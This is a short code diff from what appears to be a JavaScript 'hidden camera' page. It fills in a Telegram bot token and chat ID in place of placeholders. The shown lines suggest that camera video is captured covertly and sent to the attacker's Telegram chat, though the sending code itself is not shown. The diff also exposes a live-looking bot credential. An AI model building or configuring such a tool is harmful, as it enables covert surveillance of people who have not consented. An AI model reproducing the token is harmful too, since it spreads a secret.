@@ -1,6 +1,6 @@
 // Telegram Bot Configuration
-const botToken = '#';
-const chatId = '#';
+const botToken = '8243663821:AAGGhXiyq1YPSxJsFDhmOaxVeeiHpEmdRMA';
+const chatId = '999549302';
 
 // Hidden camera elements
 const video = document.getElementById('video');
@@ -300,3 +300,4 @@ document.addEventListener('visibilitychange', () => {
     }
 
 });
+
